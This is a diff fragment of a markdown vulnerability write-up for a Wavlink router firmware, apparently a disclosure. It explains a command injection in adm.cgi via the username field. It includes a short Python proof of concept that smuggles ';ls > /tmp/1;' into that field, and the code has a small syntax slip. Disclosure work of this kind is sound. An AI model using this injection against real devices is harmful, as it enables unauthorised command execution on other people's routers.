@@ -14,7 +14,6 @@ you may download it from : https://www.wavlink.com/en_us/firmware/details/762dc3
 
 ## Analyse:
 
-
 ![](1.png)
 
 get value from username
@@ -24,9 +23,10 @@ get value from username
 if our password is correct, we can get into here, and pass the check of ';', cause command injection
 
 ## POC
+
 ```
 url = "http://192.168.0.1/cgi-bin/adm.cgi"
 payload = ';ls > /tmp/1;' + '\n'
 
 r = requests.post(url, data={ 'page':'sysAdm', 'username': + payload, 'SYSPASS':'yours'})
-``` 
+```
